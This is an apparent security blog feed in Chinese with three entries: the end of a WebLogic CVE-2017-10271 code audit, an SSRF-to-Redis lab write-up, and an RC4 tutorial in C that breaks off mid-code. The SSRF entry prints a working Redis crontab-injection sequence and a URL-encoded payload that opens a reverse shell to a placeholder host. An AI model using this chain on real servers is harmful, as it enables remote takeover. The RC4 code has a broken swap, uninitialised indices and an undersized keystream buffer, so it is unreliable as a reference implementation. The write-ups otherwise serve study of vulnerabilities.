class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">soapenv:</span>Header</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">soapenv:</span>Body</span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">soapenv:</span>Envelope</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在WorkContextServerTube类中的processRequest方法中，处理POST数据包中的SOAP（XML）数据</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">NextAction</span> <span class="token function">processRequest</span><span class="token punctuation">(</span><span class="token class-name">Packet</span> var1<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>isUseOldFormat <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>var1<span class="token punctuation">.</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">HeaderList</span> var2 <span class="token operator">=</span> var1<span class="token punctuation">.</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getHeaders</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">Header</span> var3 <span class="token operator">=</span> var2<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token class-name">WorkAreaConstants</span><span class="token punctuation">.</span><span class="token constant">WORK_AREA_HEADER</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>var3 <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">readHeaderOld</span><span class="token punctuation">(</span>var3<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>isUseOldFormat <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token class-name">Header</span> var4 <span class="token operator">=</span> var2<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token constant">JAX_WS_WORK_AREA_HEADER</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>var4 <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">readHeader</span><span class="token punctuation">(</span>var4<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>var1就是用户传入的SOAP（XML）数据<br><img src="/2022/11/20/CVE-2017-10271/1667220511244-207765cd-4038-4f9a-9a1b-5cc6837d01fd.png"><br>var3不为空则进入this.readHeaderOld(var3)，跟进</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">readHeaderOld</span><span class="token punctuation">(</span><span class="token class-name">Header</span> var1<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">XMLStreamReader</span> var2 <span class="token operator">=</span> var1<span class="token punctuation">.</span><span class="token function">readHeader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            var2<span class="token punctuation">.</span><span class="token function">nextTag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            var2<span class="token punctuation">.</span><span class="token function">nextTag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">XMLStreamReaderToXMLStreamWriter</span> var3 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLStreamReaderToXMLStreamWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">ByteArrayOutputStream</span> var4 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">XMLStreamWriter</span> var5 <span class="token operator">=</span> <span class="token class-name">XMLStreamWriterFactory</span><span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span>var4<span class="token punctuation">)</span><span class="token punctuation">;</span>            var3<span class="token punctuation">.</span><span class="token function">bridge</span><span class="token punctuation">(</span>var2<span class="token punctuation">,</span> var5<span class="token punctuation">)</span><span class="token punctuation">;</span>            var5<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">WorkContextXmlInputAdapter</span> var6 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WorkContextXmlInputAdapter</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>var4<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">receive</span><span class="token punctuation">(</span>var6<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">XMLStreamException</span> var7<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">WebServiceException</span><span class="token punctuation">(</span>var7<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> var8<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">WebServiceException</span><span class="token punctuation">(</span>var8<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2022/11/20/CVE-2017-10271/1667221923223-a4cc9b89-f514-48df-8c83-7eb830005eb3.png">在readHeaderOld中，WorkContextXmlInputAdapter var6 &#x3D; new WorkContextXmlInputAdapter(new ByteArrayInputStream(var4.toByteArray()));<br>而var4中是我们传入的SOAP（XML）数据，，以字节流的形式传给WorkContextXmlInputAdapter跟进 this.receive(var6);<br><img src="/2022/11/20/CVE-2017-10271/1667229334100-23e0d637-613f-420f-b5fa-ace047276bb3.png"><br>跟进 var2.receiveRequest(var1); var1为用户传入的XMLDecode<br><img src="/2022/11/20/CVE-2017-10271/1667229472535-7cb2faa1-a732-4f15-9fdd-f62b4aeeb0a2.png"><br>继续跟进<br><img src="/2022/11/20/CVE-2017-10271/1667229575024-e7ee50a3-cd56-4e2b-900f-00e098e328a8.png"><br>继续跟进readUTF<br><img src="/2022/11/20/CVE-2017-10271/1667229595165-bc4df4ac-0aea-4a39-9a54-bb62f5ac0708.png"><br>在UTF中执行了readObject（）</p><p><img src="/2022/11/20/CVE-2017-10271/1667284359323-171236aa-b071-4038-a4cf-2df2c8f90d4a.png"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>CVE-2017-10271在weblogic的WLS-security组件对外提供的webservice服务，接受用户传入的SOAP（XML）参数，在传入XML后被编译成字节流（以二进制的方式存储在磁盘当中），在最后readUTF这个函数中对字节流进行了反序列化，readObject（）。</p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> 远程调试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ssrf+redis反弹shell</title>
      <link href="/2022/11/03/ssrf+redis%E5%8F%8D%E5%BC%B9shell/"/>
      <url>/2022/11/03/ssrf+redis%E5%8F%8D%E5%BC%B9shell/</url>
      
        <content type="html"><![CDATA[<h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><p> <img src="/2022/11/03/ssrf+redis%E5%8F%8D%E5%BC%B9shell/0.png"><br>由攻击者发送恶意url到服务器上，服务端发起的URL请求</p><p>PHP中可以造成ssrf的函数<br>1）file_get_contents()把整个文件读入一个字符串中;支持http(s),file协议，在PHP5.4上测试不支持dict，ghoper协议。也有可能是我操作方式不对，在file_get_contents利用dict和ghoper协议大家有利用成功的吗？<br>2）fsockopen():打开一个网络连接或者一个Unix套接字连接，在PHP5.4上测试只有http协议成功<br>3）curl_exec():用于执行指定的CURL会话，支持的协议比较多，常用于SSRF的协议经过测试都支持，如dict,ghoper,file。有的协议需要一定的条件这点需要注意。</p><p>扫描内网端口，读取任意文件，攻击内网应用，例如redis(6379)，mysql</p><p>协议：HTTP（s）,file,dict,ghoper</p><p>ghope用在ssrf扩展攻击面<br>gopher url 格式为：<br>gopher:&#x2F;&#x2F;<host>:<port>&#x2F;<gopher-path><br>在java8中gopher协议被移除</gopher-path></port></host></p><p><img src="/2022/11/03/ssrf+redis%E5%8F%8D%E5%BC%B9shell/1.png"></p><p><img src="/2022/11/03/ssrf+redis%E5%8F%8D%E5%BC%B9shell/2.png"><br>docker 拉取环境镜像，访问ssrf漏洞存在<br><img src="/2022/11/03/ssrf+redis%E5%8F%8D%E5%BC%B9shell/3.png"><br>抓取包内容<br><img src="/2022/11/03/ssrf+redis%E5%8F%8D%E5%BC%B9shell/4.png"><br>在operator参数下访问IP：port<br><img src="/2022/11/03/ssrf+redis%E5%8F%8D%E5%BC%B9shell/5.png"><br>返回错误值，改为一个不能访问的port<br><img src="/2022/11/03/ssrf+redis%E5%8F%8D%E5%BC%B9shell/7.png"><br>返回cloud not connect over http 通过不同的状态即可扫描内网状态。<br>cloud not connect over http是端口不存在<br>当ip端口都存在时，提示如下报错：（content-type可不同）<br>ip不存在 no route host<br>Weblogic的SSRF有一个比较大的特点，其虽然是一个“GET”请求，但是我们可以通过传入%0a%0d来注入换行符，而某些服务（如redis)是通过换行符来分隔每条命令，也就说我们可以通过该SSRF攻击内网中的redis服务器。<br>首先探测内网</p><p>set 1 “\n\n\n\n* * * * * root bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;IP:端口 0&gt;&amp;1\n\n\n\n”<br>config set dir &#x2F;etc&#x2F;<br>config set dbfilename crontab<br>save  ##将反弹shell写入到&#x2F;etc&#x2F;crontab ##&#x2F;etc&#x2F;crontab 这个文件负责安排由系统管理员制定的维护系统以及其他任务的crontab ##&#x2F;etc&#x2F;cron.d&#x2F;* 将任意文件写到该目录下，效果和crontab相同，格式也要和&#x2F;etc&#x2F;crontab相同。漏洞利用这个目录，可以做到不覆盖任何其他文件的情况进行弹shell。</p><p>docker环境原因无法找到内网开启redis服务<br><img src="/2022/11/03/ssrf+redis%E5%8F%8D%E5%BC%B9shell/6.png"><br>编码后反弹即可get shell</p><p>operator&#x3D;<a href="http://172.18.0.1:6379/">http://172.18.0.1:6379</a>&#x2F;test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn0-59%200-23%201-31%201-12%200-6%20root%20bash%20-c%20’sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2Fevil%2F21%200%3E%261’%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
            <tag> ssrf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RC4加密算法</title>
      <link href="/2021/11/18/rc4/"/>
      <url>/2021/11/18/rc4/</url>
      
        <content type="html"><![CDATA[<h1 id="RC4"><a href="#RC4" class="headerlink" title="RC4"></a>RC4</h1><h2 id="算法原理"><a href="#算法原理" class="headerlink" title="算法原理"></a>算法原理</h2><p>RC4以字节流的方式对明文进行加密，解密时也是以字节流的方式进行解密，并且加解密用的密钥相同，所以RC4属于对称加密算法。RC4加密主要通过S盒的初始化和置换，在生成密钥流，最后对明文进行加密。</p><h2 id="S盒和T的初始化"><a href="#S盒和T的初始化" class="headerlink" title="S盒和T的初始化"></a>S盒和T的初始化</h2><p>S盒中按序从0到255，再通过临时变量T，对S盒进行置换</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">KSA</span><span class="token punctuation">(</span><span class="token keyword">int</span> len<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> i<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">256</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        S<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span>        T<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> key<span class="token punctuation">[</span>i <span class="token operator">%</span> len<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token comment">//对s进行初始化</span>    <span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> temp<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">256</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        j <span class="token operator">=</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> S<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> T<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">256</span><span class="token punctuation">;</span>        temp <span class="token operator">=</span> S<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        S<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> S<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>        S<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> S<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token comment">//对s完成置换</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">256</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token punctuation">,</span>S<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="密钥流的生成"><a href="#密钥流的生成" class="headerlink" title="密钥流的生成"></a>密钥流的生成</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">generateKey</span><span class="token punctuation">(</span><span class="token keyword">int</span> mlen<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> i<span class="token punctuation">,</span> j<span class="token punctuation">,</span> t <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> temp<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> l <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> l <span class="token operator">&lt;</span> mlen<span class="token punctuation">;</span> l<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        i <span class="token operator">=</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span><span class="token punctuation">;</span>        j <span class="token operator">=</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> S<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span><span class="token punctuation">;</span>        temp <span class="token operator">=</span> S<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        S<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> S<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>        S<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> S<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        t <span class="token operator">=</span> <span class="token punctuation">(</span>S<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> S<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span><span class="token punctuation">;</span>        ks<span class="token punctuation">[</span>l<span class="token punctuation">]</span> <span class="token operator">=</span> S<span class="token punctuation">[</span>t<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="对明文进行加解密"><a href="#对明文进行加解密" class="headerlink" title="对明文进行加解密"></a>对明文进行加解密</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">encode</span><span class="token punctuation">(</span><span class="token keyword">int</span> len<span class="token punctuation">,</span><span class="token keyword">int</span> mlen<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">KSA</span><span class="token punctuation">(</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">generateKey</span><span class="token punctuation">(</span>mlen<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> i<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> mlen<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        data<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>data<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>ks<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">puts</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">decode</span><span class="token punctuation">(</span><span class="token keyword">int</span> len<span class="token punctuation">,</span><span class="token keyword">int</span> mlen<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">KSA</span><span class="token punctuation">(</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">generateKey</span><span class="token punctuation">(</span>mlen<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> i<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>mlen<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        data<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> data<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> ks<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"decode:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="程序执行的结果"><a href="#程序执行的结果" class="headerlink" title="程序执行的结果"></a>程序执行的结果</h2><p><img src="/2021/11/18/rc4/image-20230202134433214.png"></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> S<span class="token punctuation">[</span><span class="token number">256</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> T<span class="token punctuation">[</span><span class="token number">256</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> key<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"nosorandomkey"</span><span class="token punctuation">;</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> ks<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> data<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"Good"</span><span class="token punctuation">;</span><span class="token comment">//密钥编排</span><span class="token keyword">void</span> <span class="token function">KSA</span><span class="token punctuation">(</span><span class="token keyword">int</span> len<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> i<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">256</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        S<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span>        T<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> key<span class="token punctuation">[</span>i <span class="token operator">%</span> len<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token comment">//对s进行初始化</span>    <span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> temp<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">256</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        j <span class="token operator">=</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> S<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> T<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">256</span><span class="token punctuation">;</span>        temp <span class="token operator">=</span> S<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        S<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> S<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>        S<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> S<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token comment">//对s完成置换</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">256</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token punctuation">,</span>S<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//密钥流生成</span><span class="token keyword">void</span> <span class="token function">generateKey</span><span class="token punctuation">(</span><span class="token keyword">int</span> mlen<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> i<span class="token punctuation">,</span> j<span class="token punctuation">,</span> t <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> temp<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> l <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> l <span class="token operator">&lt;</span> mlen<span class="token punctuation">;</span> l<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        i <span class="token operator">=</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span><span class="token punctuation">;</span>        j <span class="token operator">=</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> S<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span><span class="token punctuation">;</span>        temp <span class="token operator">=</span> S<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        S<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> S<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>        S<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> S<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        t <span class="token operator">=</span> <span class="token punctuation">(</span>S<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> S<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span><span class="token punctuation">;</span>        ks<span class="token punctuation">[</span>l<span class="token punctuation">]</span> <span class="token operator">=</span> S<span class="token punctuation">[</span>t<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">encode</span><span class="token punctuation">(</span><span class="token keyword">int</span> len<span class="token punctuation">,</span><span class="token keyword">int</span> mlen<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">KSA</span><span class="token punctuation">(</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">generateKey</span><span class="token punctuation">(</span>mlen<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> i<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> mlen<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        data<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>data<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>ks<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span 